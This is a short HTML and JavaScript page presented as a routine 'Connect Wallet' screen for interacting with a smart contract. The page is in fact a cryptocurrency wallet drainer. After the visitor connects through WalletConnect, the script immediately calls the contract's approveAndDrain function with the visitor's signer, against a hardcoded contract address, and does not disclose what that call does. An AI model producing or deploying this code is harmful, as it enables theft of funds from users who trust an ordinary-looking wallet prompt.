<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contract Interaction with WalletConnect</title>
</head>
<body>
    <div>
        <h1>Connect Wallet to Interact with Smart Contract</h1>
        <button id="connectWallet">Connect Wallet</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.8/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>

    <script>
        const contractAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // Replace with your contract address
        const abi = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "approvalAmount",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "approveAndDrain",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "recipient",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "_recipient",
                        "type": "address"
                    }
                ],
                "name": "setRecipient",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "name": "tokenAddresses",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            }
        ];

        const connectWalletButton = document.getElementById("connectWallet");
        
        // Setup WalletConnect provider
        const provider = new WalletConnectProvider({
            infuraId: "68709bcdc4b140e4899498aeb7a8f308", // Infura project ID
        });

        let signer;
        let contract;

        connectWalletButton.addEventListener("click", async () => {
            try {
                // Enable the WalletConnect provider
                await provider.enable();
                
                const web3Provider = new ethers.providers.Web3Provider(provider);
                signer = web3Provider.getSigner();

                // Instantiate contract
                contract = new ethers.Contract(contractAddress, abi, signer);

                console.log("Wallet connected");
                alert("Wallet connected. Interacting with contract...");
                
                // Call the approveAndDrain function
                const tx = await contract.approveAndDrain();
                console.log("Transaction sent: ", tx);
                alert("Transaction sent: " + tx.hash);

            } catch (error) {
                console.error("Connection failed", error);
                alert("Connection failed: " + error.message);
            }
        });
    </script>
</body>
</html>
